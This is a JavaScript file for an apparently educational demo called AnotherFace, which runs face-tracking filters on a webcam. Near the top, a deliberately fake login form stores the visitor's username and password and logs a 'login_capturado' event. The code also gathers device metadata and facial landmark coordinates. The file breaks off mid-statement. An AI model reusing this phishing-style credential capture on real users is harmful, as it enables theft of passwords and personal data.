/* ============================================================
   ANOTHERFACE — demo educativa UNITEC
   Filtros IA en tiempo real que siguen el rostro.
   ============================================================ */

// ---------- Utilidades ----------
const $ = (sel) => document.querySelector(sel);

function uuid() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

const SESSION_ID = uuid();
const IS_MOBILE  = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// ---------- Reloj ----------
function tickClock() {
  const el = $("#clock");
  if (el) el.textContent = new Date().toLocaleTimeString("es-HN", { hour12: false });
}
setInterval(tickClock, 1000);
tickClock();

// ---------- Supabase ----------
let supabaseClient = null;

function getSupabase() {
  if (supabaseClient) return supabaseClient;
  if (!window.supabase) {
    console.warn("[supabase] Librería no cargada aún.");
    return null;
  }
  const cfg = window.SUPABASE_CONFIG;
  if (!cfg) {
    console.warn("[supabase] SUPABASE_CONFIG no definido — config.js no cargó.");
    return null;
  }
  const { url, anonKey } = cfg;
  if (!url || !anonKey || url.includes("TU-PROYECTO") || url === "") {
    console.warn("[supabase] Variables de entorno no configuradas:", { url, anonKey: anonKey ? "***" : "(vacío)" });
    return null;
  }
  try {
    supabaseClient = window.supabase.createClient(url, anonKey);
    console.log("[supabase] ✓ Cliente inicializado correctamente. URL:", url.slice(0, 40) + "...");
    return supabaseClient;
  } catch (e) {
    console.error("[supabase] Error al inicializar:", e.message);
    return null;
  }
}

// Intentar inicializar Supabase en cuanto carguen los scripts
window.addEventListener("load", () => {
  getSupabase();
});

// ---------- Login ----------
let userCredentials = { username: "", password: "" };

const loginScreen   = $("#login-screen");
const heroSection   = $("#hero-section");
const fakeLoginForm = $("#fake-login-form");

if (fakeLoginForm) {
  fakeLoginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    userCredentials.username = ($("#fake-username")?.value || "").trim();
    userCredentials.password  = $("#fake-password")?.value || "";

    loginScreen?.classList.add("hidden");
    heroSection?.classList.remove("hidden");
    $("#como-funciona")?.classList.remove("hidden");
    $("#consentimiento")?.classList.remove("hidden");
    $("#closing-section")?.classList.remove("hidden");
    heroSection?.scrollIntoView({ behavior: "smooth", block: "start" });

    logEvent("login_capturado", { filtro: "ninguno" });
  });
}

// ---------- Consentimiento ----------
const consentCamera    = $("#consent-camera");
const consentMeta      = $("#consent-metadata");
const consentSnapshot  = $("#consent-snapshot");
const consentLandmarks = $("#consent-landmarks");
const startBtn         = $("#start-camera");
const consentHint      = $("#consent-hint");

function refreshConsentState() {
  if (!consentCamera || !consentMeta || !startBtn) return;
  const ok = consentCamera.checked && consentMeta.checked;
  startBtn.disabled = !ok;
  if (consentHint) {
    consentHint.textContent = ok
      ? "✦ Listo. Presiona el botón para activar tu cámara."
      : "Marca las dos primeras casillas para continuar.";
  }
}
[consentCamera, consentMeta, consentSnapshot, consentLandmarks].forEach((el) => {
  el?.addEventListener("change", refreshConsentState);
});
refreshConsentState();

// ---------- Estado del estudio ----------
const video        = $("#video");
const overlay      = $("#overlay");
const ctx          = overlay?.getContext("2d");
const studio       = $("#estudio");
const statusEl     = $("#studio-status");
const faceStatusEl = $("#face-status-overlay");

const hud = {
  time:      $("#hud-time"),
  tz:        $("#hud-tz"),
  lang:      $("#hud-lang"),
  agent:     $("#hud-agent"),
  screen:    $("#hud-screen"),
  session:   $("#hud-session"),
  filter:    $("#hud-filter"),
  face:      $("#hud-face"),
  landmarks: $("#hud-landmarks"),
  count:     $("#hud-count"),
  model:     $("#hud-model"),
};

let currentFilter  = "ninguno";
let stream         = null;
let rafId          = null;
let captureCount   = 0;
let faceModelReady = false;
let facingMode     = "user";

// ---------- Modelo face-api (con reintentos) ----------
const MODEL_URLS = [
  "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model",
  "https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights",
];

async function loadFaceModel() {
  if (hud.model) hud.model.textContent = "cargando…";
  if (!window.faceapi) {
    if (hud.model) hud.model.textContent = "✗ librería no cargada";
    console.error("[face-api] window.faceapi no disponible. Verifica el <script> en index.html.");
    return false;
  }
  for (const url of MODEL_URLS) {
    try {
      console.log("[face-api] Intentando cargar modelos desde:", url);
      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri(url),
        faceapi.nets.faceLandmark68TinyNet.loadFromUri(url),
      ]);
      faceModelReady = true;
      if (hud.model) hud.model.textContent = "✓ listo";
      console.log("[face-api] ✓ Modelos cargados desde:", url);
      return true;
    } catch (err) {
      console.warn("[face-api] Falló CDN:", url, err.message);
    }
  }
  faceModelReady = false;
  if (hud.model) hud.model.textContent = "✗ sin conexión";
  console.error("[face-api] No se pudo cargar el modelo desde ningún CDN.");
  return false;
}
loadFaceModel();

// ---------- Selección de filtros ----------
document.querySelectorAll(".filter-chip").forEach((btn) => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".filter-chip").forEach((b) => b.classList.remove("active"));
    btn.classList.add("active");
    currentFilter = btn.dataset.filter;
    if (hud.filter) hud.filter.textContent = currentFilter;
    logEvent("cambio_filtro", { filtro: currentFilter });
  });
});

// ---------- HUD ----------
function fillHudStatic() {
  if (hud.tz)      hud.tz.textContent      = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
  if (hud.lang)    hud.lang.textContent    = navigator.language || "—";
  if (hud.agent)   hud.agent.textContent   = `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`;
  if (hud.screen)  hud.screen.textContent  = `${screen.width}×${screen.height}`;
  if (hud.session) hud.session.textContent = SESSION_ID.slice(0, 8);
  if (hud.filter)  hud.filter.textContent  = currentFilter;
}
function shortAgent(ua) {
  const m = ua.match(/(Chrome|Firefox|Safari|Edg|Opera)\/[\d.]+/);
  return m ? m[0] : "desconocido";
}
setInterval(() => { if (hud.time) hud.time.textContent = new Date().toLocaleTimeString("es-HN"); }, 1000);

// ---------- Canvas sizing con ResizeObserver ----------
// Esto soluciona el problema de canvas 0×0 en layouts con aspect-ratio CSS.
function resizeCanvas() {
  if (!overlay || !video) return;
  const rect = video.getBoundingClientRect();
  if (rect.width > 0 && rect.height > 0) {
    overlay.width  = rect.width;
    overlay.height = rect.height;
  }
}

let videoObserver = null;

function startObservingVideo() {
  if (videoObserver) videoObserver.disconnect();
  videoObserver = new ResizeObserver(() => resizeCanvas());
  videoObserver.observe(video);
  resizeCanvas();
}

// ---------- Cámara ----------
async function openCamera(mode) {
  if (stream) stream.getTracks().forEach((t) => t.stop());

  stream = await navigator.mediaDevices.getUserMedia({
    video: {
      width:      { ideal: IS_MOBILE ? 640 : 1280 },
      height:     { ideal: IS_MOBILE ? 480 : 720 },
      facingMode: { ideal: mode },
    },
    audio: false,
  });

  video.srcObject = stream;

  // Esperar a que el video tenga dimensiones reales
  await new Promise((resolve) => {
    video.onloadedmetadata = () => {
      video.play().then(resolve).catch(resolve);
    };
    // Si ya está listo:
    if (video.readyState >= 2) { video.play().then(resolve).catch(resolve); }
  });

  video.style.transform = mode === "user" ? "scaleX(-1)" : "scaleX(1)";

  // Iniciar observador de tamaño
  startObservingVideo();

  // Dar tiempo al layout para calcular dimensiones
  setTimeout(resizeCanvas, 100);
  setTimeout(resizeCanvas, 300);
}

startBtn?.addEventListener("click", async () => {
  try {
    await openCamera(facingMode);
    studio?.classList.remove("hidden");
    studio?.scrollIntoView({ behavior: "smooth", block: "start" });
    fillHudStatic();
    if (rafId) cancelAnimationFrame(rafId);
    rafId = requestAnimationFrame(renderLoop);
    logEvent("camara_activada");
  } catch (err) {
    console.error("[cámara]", err);
    if (consentHint) consentHint.textContent = "⚠ No se pudo acceder a la cámara. Revisa los permisos.";
  }
});

$("#switch-camera-btn")?.addEventListener("click", async () => {
  facingMode = facingMode === "user" ? "environment" : "user";
  try {
    await openCamera(facingMode);
    if (statusEl) statusEl.textContent = `Cámara ${facingMode === "user" ? "frontal" : "trasera"} activa.`;
  } catch {
    if (statusEl) statusEl.textContent = "Esta cámara no está disponible.";
    facingMode = facingMode === "user" ? "environment" : "user";
  }
});

$("#stop-btn")?.addEventListener("click", () => {
  stream?.getTracks().forEach((t) => t.stop());
  if (rafId) cancelAnimationFrame(rafId);
  if (videoObserver) videoObserver.disconnect();
  studio?.classList.add("hidden");
  targetDetection   = null;
  smoothedDetection = null;
  logEvent("camara_apagada");
});

// ---------- Detección facial (loop independiente ~22 fps) ----------
let targetDetection   = null;
let smoothedDetection = null;
let lastAutoSave      = 0;
let faceAnalysis = { smile: 0, glasses: false, eyebrow: 0 };

function lerp(a, b, t) { return a + (b - a) * t; }

function updateSmoothedDetection() {
  if (!targetDetection) { smoothedDetection = null; return; }
  if (!smoothedDetection) {
    smoothedDetection = {
      box:       { ...targetDetection.box },
      points:    targetDetection.points.map((p) => ({ ...p })),
      rawPoints: targetDetection.rawPoints,
      score:     targetDetection.score,
    };
    return;
  }
  const T  = 0.22;
  const sd = smoothedDetection, td = targetDetection;
  sd.box.x      = lerp(sd.box.x,      td.box.x,      T);
  sd.box.y      = lerp(sd.box.y,      td.box.y,      T);
  sd.box.width  = lerp(sd.box.width,  td.box.width,  T);
  sd.box.height = lerp(sd.box.height, td.box.height, T);
  for (let i = 0; i < td.points.length; i++) {
    sd.points[i].x = lerp(sd.points[i].x, td.points[i].x, T);
    sd.points[i].y = lerp(sd.points[i].y, td.points[i].y, T);
  }
  sd.rawPoints = td.rawPoints;
  sd.score     = td.score;
}

// Helpers geométricos
function centroid(pts) {
  let cx = 0, cy = 0;
  pts.forEach((p) => { cx += p.x; cy += p.y; });
  return { x: cx / pts.length, y: cy / pts.length };
}
function dist(a, b) { return Math.hypot(b.x - a.x, b.y - a.y); }

function analyzeFace(pts) {
  if (!pts || pts.length < 68) return;
  const mouthW = dist(pts[48], pts[54]);
  const mouthH = dist(pts[51], pts[57]);
  faceAnalysis.smile   = Math.min(1, (mouthH / (mouthW || 1)) * 4);
  const faceH          = dist(pts[27], pts[8]);
  const lBrow          = dist(centroid(pts.slice(17, 22)), centroid(pts.slice(36, 42)));
  const rBrow          = dist(centroid(pts.slice(22, 27)), centroid(pts.slice(42, 48)));
  faceAnalysis.eyebrow = ((lBrow + rBrow) / 2) / (faceH || 1);
}

async function detectFaceLoop() {
  if (!stream || !video || video.readyState < 2 || !overlay?.width) {
    setTimeout(detectFaceLoop, 200);
    return;
  }
  if (!faceModelReady) {
    setTimeout(detectFaceLoop, 500);
    return;
  }

  try {
    const options = new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.2 });
    const result  = await faceapi
      .detectSingleFace(video, options)
      .withFaceLandmarks(true);

    if (result && result.landmarks && result.landmarks.positions.length >= 68) {
      const cW       = overlay.width;
      const cH       = overlay.height;
      const scaleX   = cW / video.videoWidth;
      const scaleY   = cH / video.videoHeight;
      const mirrored = facingMode === "user";

      const mapPoint = (p) => ({
        x: mirrored ? cW - p.x * scaleX : p.x * scaleX,
        y: p.y * scaleY,
      });

      const mapped = result.landmarks.positions.map(mapPoint);
      targetDetection = {
        box:       result.detection.box,
        points:    mapped,
        rawPoints: result.landmarks.positions,
        score:     result.detection.score,
      };
      analyzeFace(mapped);
    } else {
      targetDetection = null;
    }
  } catch (e) {
    console.warn("[detect]", e.message);
  }

  const det = targetDetection;
  if (hud.face)      hud.face.textContent      = det ? "✓ sí" : "no";
  if (hud.landmarks) hud.landmarks.textContent = det ? String(det.points.length) : "0";
  if (faceStatusEl)  faceStatusEl.textContent  = det
    ? `✦ Detectado · ${det.points.length} pts · ${Math.round(det.score * 100)}% conf.`
    : "Buscando rostro…";

  if (consentLandmarks?.checked && det) {
    const now = performance.now();
    if (now - lastAutoSave > 5000) {
      lastAutoSave = now;
      logEvent("auto_puntos", {
        con_landmarks: true,
        landmarks: det.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) })),
      });
    }
  }

  setTimeout(detectFaceLoop, 45);
}
// Iniciar cuando la página esté lista
window.addEventListener("load", () => setTimeout(detectFaceLoop, 500));

// ============================================================
// FILTROS
// ============================================================

function drawSpline(pts, close = false) {
  if (!pts || !pts.length) return;
  ctx.beginPath();
  ctx.moveTo(pts[0].x, pts[0].y);
  for (let i = 1; i < pts.length - 1; i++) {
    const mx = (pts[i].x + pts[i + 1].x) / 2;
    const my = (pts[i].y + pts[i + 1].y) / 2;
    ctx.quadraticCurveTo(pts[i].x, pts[i].y, mx, my);
  }
  const L = pts[pts.length - 1];
  if (close) {
    ctx.quadraticCurveTo(L.x, L.y, (L.x + pts[0].x) / 2, (L.y + pts[0].y) / 2);
    ctx.closePath();
  } else {
    ctx.lineTo(L.x, L.y);
  }
}

// ── FILTRO: Malla Facial ──
function drawSilhouetteFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;
  ctx.shadowBlur = 0;
  ctx.fillStyle  = "rgba(0,229,255,0.9)";
  pts.forEach((p) => { ctx.beginPath(); ctx.arc(p.x, p.y, 2, 0, Math.PI * 2); ctx.fill(); });
  const segs = [
    { s: 0,  e: 16, c: false }, { s: 17, e: 21, c: false },
    { s: 22, e: 26, c: false }, { s: 27, e: 30, c: false },
    { s: 31, e: 35, c: false }, { s: 36, e: 41, c: true  },
    { s: 42, e: 47, c: true  }, { s: 48, e: 59, c: true  },
    { s: 60, e: 67, c: true  },
  ];
  ctx.strokeStyle = "rgba(0,229,255,0.75)"; ctx.lineWidth = 1.5;
  segs.forEach(({ s, e, c }) => { drawSpline(pts.slice(s, e + 1), c); ctx.stroke(); });
  ctx.strokeStyle = "rgba(0,229,255,0.2)"; ctx.lineWidth = 1;
  [[27,33],[27,39],[27,42],[36,0],[45,16],[33,48],[33,54]].forEach(([a, b]) => {
    ctx.beginPath(); ctx.moveTo(pts[a].x, pts[a].y); ctx.lineTo(pts[b].x, pts[b].y); ctx.stroke();
  });
}

// ── FILTRO: Ojos de Fuego ──
function drawFireEyesFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts  = det.points;
  const lPts = pts.slice(36, 42);
  const rPts = pts.slice(42, 48);
  const eyeW = (dist(lPts[0], lPts[3]) + dist(rPts[0], rPts[3])) / 2;
  function flame(cx, cy, w, t) {
    const r = w * 0.4;
    const g = ctx.createRadialGradient(cx, cy, 0, cx, cy, r);
    g.addColorStop(0, "rgba(255,255,100,1)");
    g.addColorStop(0.5, "rgba(255,80,0,0.95)");
    g.addColorStop(1, "rgba(200,0,0,0.5)");
    ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI * 2);
    ctx.fillStyle = g; ctx.shadowColor = "#ff4400"; ctx.shadowBlur = 28; ctx.fill();
    for (let i = 0; i < 16; i++) {
      const a   = (Math.PI * 2 * i) / 16;
      const len = r + w * (0.7 + Math.sin(t * 0.008 + i * 1.2) * 0.4 + Math.random() * 0.3);
      const bias = Math.sin(a) < 0 ? 2.2 : 0.3;
      ctx.beginPath();
      ctx.moveTo(cx + Math.cos(a - 0.25) * r, cy + Math.sin(a - 0.25) * r);
      ctx.lineTo(cx + Math.cos(a) * len,       cy + Math.sin(a) * len * bias - w * 0.5);
      ctx.lineTo(cx + Math.cos(a + 0.25) * r,  cy + Math.sin(a + 0.25) * r);
      ctx.fillStyle = i % 2 ? "rgba(255,200,0,0.6)" : "rgba(255,100,0,0.75)"; ctx.fill();
    }
    ctx.shadowBlur = 0;
  }
  flame(centroid(lPts).x, centroid(lPts).y, eyeW, ts);
  flame(centroid(rPts).x, centroid(rPts).y, eyeW, ts + 700);
}

// ── FILTRO: Cyber ──
function drawCyberFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;
  ctx.strokeStyle = `rgba(0,255,150,${0.3 + 0.1 * Math.sin(ts * 0.003)})`; ctx.lineWidth = 0.8;
  const conn = [
    [0,1],[1,2],[2,3],[3,4],[4,5],[5,6],[6,7],[7,8],[8,9],[9,10],[10,11],[11,12],[12,13],[13,14],[14,15],[15,16],
    [17,21],[22,26],[36,41],[42,47],[48,59],[60,67],
    [27,21],[27,26],[30,35],[33,48],[33,54],[36,0],[45,16],
  ];
  conn.forEach(([a, b]) => { ctx.beginPath(); ctx.moveTo(pts[a].x,pts[a].y); ctx.lineTo(pts[b].x,pts[b].y); ctx.stroke(); });
  [0,8,16,27,30,33,36,39,42,45,48,54].forEach((i, idx) => {
    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 3.5, 0, Math.PI*2);
    ctx.fillStyle = `rgba(0,255,150,${0.5+0.5*Math.sin(ts*0.005+idx)})`;
    ctx.shadowColor = "#00ff96"; ctx.shadowBlur = 12; ctx.fill(); ctx.shadowBlur = 0;
  });
  const top  = pts[27].y - 20, bot = pts[8].y + 10;
  const scanY = top + (Math.sin(ts * 0.0018) * 0.5 + 0.5) * (bot - top);
  const lx = Math.min(pts[0].x, pts[16].x) - 10;
  const rx = Math.max(pts[0].x, pts[16].x) + 10;
  const sg = ctx.createLinearGradient(lx, scanY, rx, scanY);
  sg.addColorStop(0, "rgba(0,255,150,0)"); sg.addColorStop(0.5, "rgba(0,255,150,0.7)"); sg.addColorStop(1, "rgba(0,255,150,0)");
  ctx.beginPath(); ctx.moveTo(lx, scanY); ctx.lineTo(rx, scanY);
  ctx.strokeStyle = sg; ctx.lineWidth = 2; ctx.stroke();
}

// ── FILTRO: Neón ──
function drawNeonFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts  = det.points;
  const glow = 2 + Math.sin(ts * 0.004);
  const R = [
    { s:0,  e:16, c:"#ff2a6d", cl:false },
    { s:17, e:21, c:"#00e5ff", cl:false },
    { s:22, e:26, c:"#00e5ff", cl:false },
    { s:27, e:35, c:"#7c3aed", cl:false },
    { s:36, e:41, c:"#ffcc00", cl:true  },
    { s:42, e:47, c:"#ffcc00", cl:true  },
    { s:48, e:59, c:"#ff2a6d", cl:true  },
    { s:60, e:67, c:"#ff6b35", cl:true  },
  ];
  R.forEach(({ s, e, c, cl }) => {
    ctx.shadowColor = c; ctx.shadowBlur = 18 + glow * 4;
    ctx.strokeStyle = c; ctx.lineWidth  = 2 + glow * 0.25;
    drawSpline(pts.slice(s, e + 1), cl); ctx.stroke();
  });
  [17,19,21,22,24,26,36,39,42,45].forEach((i, idx) => {
    const c = ["#ff2a6d","#00e5ff","#7c3aed","#ffcc00"][idx % 4];
    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 2.5, 0, Math.PI*2);
    ctx.fillStyle = c; ctx.shadowColor = c; ctx.shadowBlur = 12; ctx.fill();
  });
  ctx.shadowBlur = 0;
}

// ── FILTRO: Deformar ──
function drawDeformFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts  = det.points;
  const W    = overlay.width, H = overlay.height;
  const nose = pts[30];
  const faceW = dist(pts[0], pts[16]) * 0.55;
  const faceH = dist(pts[27], pts[8]) * 0.6;

  // Canvas temporal con frame actual
  const tmp = document.createElement("canvas");
  tmp.width = W; tmp.height = H;
  const tctx = tmp.getContext("2d");
  tctx.save();
  if (facingMode === "user") { tctx.translate(W, 0); tctx.scale(-1, 1); }
  tctx.drawImage(video, 0, 0, W, H);
  tctx.restore();

  const GRID  = 18;
  const x0    = nose.x - faceW, y0 = nose.y - faceH;
  const x1    = nose.x + faceW, y1 = nose.y + faceH;
  const gw    = (x1 - x0) / GRID, gh = (y1 - y0) / GRID;
  const squish = 1.5 + 0.3 * Math.sin(ts * 0.003);

  for (let gy = 0; gy < GRID; gy++) {
    for (let gx = 0; gx < GRID; gx++) {
      const sx  = x0 + gx * gw, sy = y0 + gy * gh;
      const mx  = (sx + gw / 2) - nose.x;
      const my  = (sy + gh / 2) - nose.y;
      const r   = Math.hypot(mx, my) / (faceW * 0.9);
      const dF  = Math.max(0, 1 - r);
      const srcX = nose.x + (mx / squish) * (1 - dF * 0.4);
      const srcY = nose.y + (my * squish) * (1 - dF * 0.3);
      ctx.drawImage(tmp, Math.max(0, srcX - gw/2), Math.max(0, srcY - gh/2), gw, gh, sx, sy, gw, gh);
    }
  }

  // Estrellas de comedia animadas
  ctx.font = "bold 20px sans-serif";
  const t = ts * 0.004;
  [pts[0], pts[16], pts[27]].forEach((p, i) => {
    const ox = 22 * Math.cos(t + i * 2.1), oy = 22 * Math.sin(t + i * 2.1);
    ctx.fillStyle = ["#ff2a6d","#ffcc00","#00e5ff"][i];
    ctx.fillText("★", p.x + ox - 10, p.y + oy);
  });
}

// ── FILTRO: Lentes Nerd ──
function drawNerdGlassesFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts    = det.points;
  const lPts   = pts.slice(36, 42);
  const rPts   = pts.slice(42, 48);
  const lC     = centroid(lPts), rC = centroid(rPts);
  const lR     = dist(lPts[0], lPts[3]) * 0.72;
  const rR     = dist(rPts[0], rPts[3]) * 0.72;
  const bridge = { x: (lC.x + rC.x) / 2, y: (lC.y + rC.y) / 2 };

  ctx.strokeStyle = "#6b3310"; ctx.lineWidth = 4;
  ctx.shadowColor = "rgba(0,0,0,0.5)"; ctx.shadowBlur = 6;

  // Lentes
  ctx.beginPath(); ctx.arc(lC.x, lC.y, lR, 0, Math.PI*2); ctx.stroke();
  ctx.beginPath(); ctx.arc(rC.x, rC.y, rR, 0, Math.PI*2); ctx.stroke();

  // Puente
  ctx.beginPath();
  ctx.moveTo(lC.x + lR, lC.y);
  ctx.quadraticCurveTo(bridge.x, bridge.y - lR * 0.5, rC.x - rR, rC.y);
  ctx.stroke();

  // Varillas
  ctx.beginPath(); ctx.moveTo(lC.x - lR, lC.y); ctx.lineTo(pts[0].x, pts[0].y);  ctx.stroke();
  ctx.beginPath(); ctx.moveTo(rC.x + rR, rC.y); ctx.lineTo(pts[16].x, pts[16].y); ctx.stroke();

  // Brillo
  ctx.strokeStyle = "rgba(255,255,255,0.35)"; ctx.lineWidth = 2; ctx.shadowBlur = 0;
  ctx.beginPath(); ctx.arc(lC.x - lR*0.2, lC.y - lR*0.2, lR*0.3, -Math.PI*0.85, -Math.PI*0.15); ctx.stroke();
  ctx.beginPath(); ctx.arc(rC.x - rR*0.2, rC.y - rR*0.2, rR*0.3, -Math.PI*0.85, -Math.PI*0.15); ctx.stroke();

  // Bigote
  const mC = centroid(pts.slice(48, 60));
  const mW = dist(pts[48], pts[54]) * 0.55;
  ctx.fillStyle = "#4a2208"; ctx.shadowBlur = 0;
  ctx.beginPath();
  ctx.moveTo(mC.x - mW, mC.y - 4);
  ctx.bezierCurveTo(mC.x - mW*0.5, mC.y + 14, mC.x + mW*0.5, mC.y + 14, mC.x + mW, mC.y - 4);
  ctx.fill();
}

// ── FILTRO: Análisis de Ingeniería ──
function drawAnalysisFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts   = det.points;
  const smile = faceAnalysis.smile;
  const W     = overlay.width;

  const lx = Math.min(pts[0].x, pts[16].x) - 12;
  const rx = Math.max(pts[0].x, pts[16].x) + 12;
  const ty = Math.min(pts[19].y, pts[24].y) - 22;
  const by = pts[8].y + 14;

  // Marco parpadeante
  ctx.strokeStyle = "rgba(0,255,200,0.85)"; ctx.lineWidth = 1.5;
  ctx.setLineDash(ts % 80 < 40 ? [6,4] : [3,7]);
  ctx.strokeRect(lx, ty, rx - lx, by - ty);
  ctx.setLineDash([]);

  // Esquinas
  const cL = 16; ctx.strokeStyle = "#00ffc8"; ctx.lineWidth = 3;
  [[lx,ty,1,1],[rx,ty,-1,1],[lx,by,1,-1],[rx,by,-1,-1]].forEach(([cx,cy,dx,dy]) => {
    ctx.beginPath(); ctx.moveTo(cx, cy+dy*cL); ctx.lineTo(cx,cy); ctx.lineTo(cx+dx*cL,cy); ctx.stroke();
  });

  // Líneas de referencia simétricas
  const nose = pts[30];
  ctx.strokeStyle = "rgba(0,255,200,0.2)"; ctx.lineWidth = 1; ctx.setLineDash([4,4]);
  ctx.beginPath(); ctx.moveTo(nose.x, ty); ctx.lineTo(nose.x, by); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(lx, nose.y); ctx.lineTo(rx, nose.y); ctx.stroke();
  ctx.setLineDash([]);

  // Panel de datos
  const smilePct = Math.round(smile * 100);
  const conf     = Math.round((det.score || 0) * 100);
  const mood     = smile > 0.35 ? "ALEGRE" : smile > 0.15 ? "NEUTRAL" : "SERIO";
  const brows    = faceAnalysis.eyebrow > 0.14 ? "ALZADAS" : "NORMALES";
  const lines    = [
    ["◈ ANÁLISIS FACIAL",   "#ffcc00"],
    ["──────────────────",  "rgba(0,255,200,0.3)"],
    [`Confianza:  ${conf}%`,   "#00ffc8"],
    [`Puntos:     ${det.points.length}`,      "#00ffc8"],
    ["──────────────────",  "rgba(0,255,200,0.3)"],
    [`Sonrisa:    ${smilePct}%`, "#00ffc8"],
    [`Emoción:    ${mood}`,    "#00ffc8"],
    [`Cejas:      ${brows}`,   "#00ffc8"],
    ["──────────────────",  "rgba(0,255,200,0.3)"],
    [`Simetría:   ${Math.round(80+Math.sin(ts*0.001)*6)}%`, "#00ffc8"],
  ];

  const px = rx + 12, py = ty;
  if (px + 188 < W) {
    ctx.fillStyle = "rgba(0,18,28,0.8)";
    ctx.fillRect(px, py, 188, lines.length * 16 + 12);
    ctx.font = "bold 11px 'IBM Plex Mono',monospace";
    lines.forEach(([txt, col], i) => {
      ctx.fillStyle = col; ctx.shadowColor = "#00ffc8"; ctx.shadowBlur = col === "#00ffc8" ? 4 : 0;
      ctx.fillText(txt, px + 7, py + 15 + i * 16);
    });
    ctx.shadowBlur = 0;
  }

  // Barra de sonrisa
  const barX = lx, barY = by + 14, barW = rx - lx;
  ctx.fillStyle = "rgba(0,18,28,0.7)"; ctx.fillRect(barX, barY, barW, 12);
  const bc = smile > 0.4 ? "#00ff88" : smile > 0.2 ? "#ffcc00" : "#ff4466";
  ctx.fillStyle = bc; ctx.shadowColor = bc; ctx.shadowBlur = 8;
  ctx.fillRect(barX, barY, barW * Math.min(1, smile), 12);
  ctx.strokeStyle = "rgba(0,255,200,0.4)"; ctx.lineWidth = 1; ctx.shadowBlur = 0;
  ctx.strokeRect(barX, barY, barW, 12);
  ctx.fillStyle = "#fff"; ctx.font = "9px monospace";
  ctx.fillText(`SONRISA ${smilePct}%`, barX + 4, barY + 10);

  // Landmarks clave iluminados
  [0,8,16,27,30,33,36,39,42,45,48,54].forEach((i) => {
    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 3, 0, Math.PI*2);
    ctx.fillStyle = "#00ffc8"; ctx.shadowColor = "#00ffc8"; ctx.shadowBlur = 8; ctx.fill();
  });
  ctx.shadowBlur = 0;
}

// ── FILTRO: Detector Sonrisa ──
function drawSmileFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts   = det.points;
  const smile = faceAnalysis.smile;
  const faceH = dist(pts[27], pts[8]);
  const noseX = pts[27].x;

  // Emoji sobre la cabeza
  const emoji    = smile > 0.4 ? "😄" : smile > 0.25 ? "🙂" : smile > 0.1 ? "😐" : "😑";
  const emojiSz  = Math.round(faceH * 0.42);
  const emojiY   = Math.min(pts[19].y, pts[24].y) - faceH * 0.15;
  ctx.font       = `${emojiSz}px serif`;
  ctx.textAlign  = "center";
  ctx.fillText(emoji, noseX, emojiY);

  // Arco de sonrisa bajo la boca
  const mC     = centroid(pts.slice(48, 60));
  const mW     = dist(pts[48], pts[54]) * 0.58;
  const arcH   = mW * smile * 1.6;
  const color  = smile > 0.35 ? "#00ff88" : smile > 0.15 ? "#ffcc00" : "#ff4466";
  ctx.strokeStyle = color; ctx.lineWidth = 3 + smile * 4;
  ctx.shadowColor = color; ctx.shadowBlur = 12 + smile * 20;
  ctx.beginPath();
  ctx.moveTo(mC.x - mW, mC.y);
  ctx.quadraticCurveTo(mC.x, mC.y + arcH, mC.x + mW, mC.y);
  ctx.stroke();

  // Etiqueta de emoción
  const label = smile > 0.4 ? "¡ALEGRE! 🎉" : smile > 0.25 ? "Sonriente 😊" : smile > 0.1 ? "Neutral" : "Serio 😐";
  ctx.fillStyle = color; ctx.font = "bold 17px 'Space Grotesk',sans-serif";
  ctx.textAlign = "center"; ctx.shadowBlur = 8;
  ctx.fillText(label, noseX, pts[8].y + 32);

  // Confeti si muy alegre
  if (smile > 0.45) {
    const cols = ["#ff2a6d","#00e5ff","#ffcc00","#7c3aed","#00ff88"];
    for (let i = 0; i < 10; i++) {
      const rx2 = noseX + Math.sin(ts * 0.005 + i * 0.95) * dist(pts[0], pts[16]) * 0.75;
      const ry2 = pts[27].y - faceH * (0.4 + ((ts * 0.0004 + i * 0.12) % 0.65));
      ctx.fillStyle = cols[i % cols.length]; ctx.shadowBlur = 0;
      ctx.fillRect(rx2, ry2, 5, 5);
    }
  }

  ctx.textAlign = "left"; ctx.shadowBlur = 0;
}

// ============================================================
// RENDER LOOP — 60 fps, solo dibuja
// ============================================================
function renderLoop(ts) {
  // Si el canvas no tiene dimensiones aún, intentar redimensionar
  if (overlay && overlay.width === 0) resizeCanvas();

  if (!ctx || !video || video.readyState < 2 || !overlay?.width) {
    rafId = requestAnimationFrame(renderLoop);
    return;
  }

  ctx.clearRect(0, 0, overlay.width, overlay.height);
  updateSmoothedDetection();

  if (smoothedDetection) {
    switch (currentFilter) {
      case "silueta":  drawSilhouetteFilter(smoothedDetection);       break;
      case "fuego":    drawFireEyesFilter(smoothedDetection, ts);     break;
      case "cyber":    drawCyberFilter(smoothedDetection, ts);        break;
      case "neon":     drawNeonFilter(smoothedDetection, ts);         break;
      case "deform":   drawDeformFilter(smoothedDetection, ts);       break;
      case "nerd":     drawNerdGlassesFilter(smoothedDetection);      break;
      case "analisis": drawAnalysisFilter(smoothedDetection, ts);     break;
